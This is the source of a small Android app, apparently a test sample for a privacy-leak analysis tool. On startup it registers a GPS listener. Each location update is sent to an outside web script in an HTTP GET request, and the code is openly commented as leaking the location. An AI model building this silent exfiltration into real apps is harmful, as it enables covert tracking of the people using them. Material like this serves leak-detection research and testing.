package com.example.leaklocation;

import java.io.IOException;
import java.net.MalformedURLException;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.util.Log;
import android.view.Menu;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

		// code osbert added to initiate the location listener
		LocationManager mlocManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
		LocationListener mlocListener = new MyLocationListener();
		mlocManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, mlocListener);
		
        setContentView(R.layout.activity_main);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
    
	private class LeakInfo extends AsyncTask<String, Void, Void>{

		@Override
		protected Void doInBackground(String... params) {
			String deviceId = params[0];
			try {
				HttpClient client = new DefaultHttpClient();
		        String getURL = "http://stanford.edu/~subodh/cgi-bin/stamp/id.php?gps=".concat(deviceId);
		        HttpGet get = new HttpGet(getURL);
		        HttpResponse responseGet = client.execute(get);
		        HttpEntity resEntityGet = responseGet.getEntity();
		        if (resEntityGet != null) {
                    Log.i("GET RESPONSE",EntityUtils.toString(resEntityGet));
                }
			} catch (MalformedURLException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}

			return null;
		}

	}


	// class osbert added to handle location updates
    private class MyLocationListener implements LocationListener {
		@Override
		public void onLocationChanged(Location loc) {
			// leak the location
			new LeakInfo().execute(loc.getLatitude() + "," + loc.getLongitude());
		}
		
		@Override
			public void onProviderDisabled(String provider) {
		}
		
		@Override
			public void onProviderEnabled(String provider) {
		}
		
		@Override
			public void onStatusChanged(String provider, int status, Bundle extras) {
		}
    }
}
